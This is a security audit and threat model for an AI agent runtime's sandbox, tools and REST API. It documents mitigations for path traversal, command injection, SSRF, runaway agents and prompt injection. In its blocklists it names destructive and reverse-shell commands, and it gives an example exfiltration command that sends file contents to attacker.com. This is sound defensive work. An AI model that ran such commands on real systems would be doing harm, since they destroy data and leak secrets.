# Security Audit — Agent Runtime (Sub-System A)

> **Scope:** Threat model + mitigations for the agent loop, tools, and REST API.
> **Last reviewed:** 2026-07-31

This document catalogs the security boundaries of Sub-System A, the threats we
mitigate, the tests that prove the mitigations, and the residual risks.

---

## 1. Trust model

| Actor | Trust level | Boundaries |
|---|---|---|
| Platform admin | Fully trusted | Bypass org checks; can inspect any run |
| Org admin | Trusted within their org | Can view + cancel runs in their org |
| Org member | Trusted within their org | Can invoke agents, view own runs |
| LLM (model provider) | **Untrusted input** | Output is never executed directly — only parsed + validated |
| Agent process | Trusted | Runs in a Kubernetes pod with no network egress to other orgs |
| Work dir | Trusted (within sandbox) | All file operations scoped to `work_dir` + `allowed_paths` |

The LLM is the **primary untrusted input source** — its output (tool calls,
arguments) is parsed by a 4-tier parser and then re-validated by the sandbox
**before** execution. Defense-in-depth: never trust a single layer.

---

## 2. Threat → mitigation matrix

| Threat | Mitigation | Tests |
|---|---|---|
| Path traversal (`../../etc/passwd`) | `safe_resolve_path()` rejects any path escaping `work_dir` or `allowed_paths`. Symlinks resolved before check. | `test_security.py::test_safe_resolve_path_blocks_*` |
| Symlink escape | `Path.resolve()` follows symlinks before containment check. | `test_safe_resolve_path_blocks_symlink_escape` |
| Command injection (`rm -rf /`) | Blocklist (`assert_command_safe`) — covers `rm -rf`, `sudo`, `chmod 777`, `mkfs`, `dd if=`, `curl \| sh`, fork bomb, `> /dev/sd*`, `shutdown/reboot/poweroff`. | `test_assert_command_safe_blocks_dangerous[*]` |
| Arbitrary `cwd` via `run_command` | `cwd` validated against `work_dir` via `safe_resolve_path`. | `test_run_command_blocks_path_traversal` |
| SSRF via `http_request` | Blocklist of private IPs / loopback / link-local / cloud metadata (`169.254.0.0/16`, `127.0.0.0/8`, `localhost`, `::1`, `metadata.google.internal`). | `test_http_request_blocks_localhost` |
| API key leakage in logs | `LiteLLMClient._resolve_call_kwargs` never logs the key. Test verifies. | `test_api_key_not_in_logs` |
| RBAC bypass at endpoints | `require_permission(Permission.X)` decorator + `get_current_user` dependency; cross-org access blocked. | `test_api.py::test_*_requires_permission` |
| Agent runaway (infinite LLM calls) | 4 safety systems: `CircuitBreaker` (3 consecutive tool failures), `RepetitionDetector` (12× same read / 6× same write), `EditFailureTracker` (5 cumulative edit failures), `TokenBudgetEnforcer` (per-run + per-org cap). | `test_safety.py`, `test_failure_modes.py` |
| Excessive file overwrites | `WriteFileTool` rejects writes where `new_size < 50%` of `existing_size` (forces use of `edit_file`). | `test_write_file.py` |
| Migration without approval | `MigrationGate` detects `alembic upgrade`, `prisma migrate`, `knex migrate:latest`, etc. → sets `agent_run.status = awaiting_approval`. | `test_migration_gate.py` |
| Token budget DoS | `TokenBudgetEnforcer` enforces per-run + per-org daily limits. | `test_token_budget.py` |
| Resource exhaustion (CPU/mem) | `run_command` enforces `timeout_seconds ≤ 120`, output truncated at 50 KB. | `test_run_command.py` |

---

## 3. Sandbox primitives (`app/agent/sandbox.py`)

```
safe_resolve_path(work_dir, requested, allowed_paths=()) -> str
assert_command_safe(command) -> None            # raises SandboxError
truncate_output(text, max_bytes=50_000) -> str  # for command output
```

### Blocklist rationale

The blocklist is intentionally **narrow + conservative**. We only block patterns
that are:
- Catastrophically destructive (`rm -rf`, `mkfs`)
- Privilege escalation (`sudo`)
- Clear reverse-shell vectors (`curl|sh`)
- System-bricking (`shutdown`, `dd`)

We do **not** try to whitelist all "safe" commands — that's a moving target
and would block useful operations (`npm install`, `pip install`).

### What the blocklist doesn't catch

- Resource exhaustion by legitimate-looking commands (`while true; do ...`)
  — mitigated by `timeout_seconds ≤ 120`.
- Network exfiltration (`curl https://attacker.com/?data=$(cat ...)`) — SSRF
  mitigation only blocks private destinations, not public ones.
- Output of size 100 MB (a slow but legitimate run) — mitigated by 50 KB cap.

---

## 4. Secrets handling

- **API keys** for LLM providers are stored in HashiCorp Vault, never in
  the database or logs. `LiteLLMClient` receives them via `api_key` parameter
  and passes them to litellm in-memory only.
- **JWT secrets** loaded from env (`JWT_SECRET`), validated at startup
  with a length check (≥ 32 bytes).
- **DB credentials** loaded from env (`DATABASE_URL`), not logged.

---

## 5. Audit logging

Every mutating action (agent run, tool call, file write, settings change) is
written to the `audit_log` table via `app.core.audit.audit()`. Fields:
`actor_id, actor_type, action, target_type, target_id, org_id, metadata,
created_at`. Retention: configurable per-org; default `forever` for
security-relevant events.

---

## 6. Residual risks

| Risk | Mitigation today | Future |
|---|---|---|
| LLM hallucinates an unsafe tool call | Parser + sandbox validation | Add a 2nd-layer policy checker (OPA / Rego) |
| Compromised LLM provider leaks prompts | Per-org API keys (rotatable) | Encrypted prompt bodies at rest |
| K8s pod breakout | Sandbox + read-only rootfs + non-root UID | gVisor or Kata containers |
| Insufficient rate limiting on agent endpoints | Token budget per run | Per-user/per-IP rate limit (nginx ingress) |
| Prompt injection in repo contents | Sandboxed tools ignore file content as instructions | Add a "trusted boundary" prefix in tool results |

---

## 7. Security test coverage

Tests live in `backend/tests/agent/test_security.py` (34 cases) plus
scattered negative tests in:
- `test_safety.py` — circuit breaker, repetition detector, edit failure tracker
- `test_run_command.py` — timeout, output cap, blocklist
- `test_write_file.py` — 50% overwrite reject
- `test_api.py` — RBAC + permission checks on every endpoint
- `test_migration_gate.py` — migration approval

Coverage gate: `--cov-fail-under=80` for `app/agent/**`.

---

## 8. Reporting a vulnerability

Email `security@apex.ai` (placeholder — replace when domain is registered).
Include steps to reproduce + impact. We aim to acknowledge within 24h and
patch within 7 days for critical issues.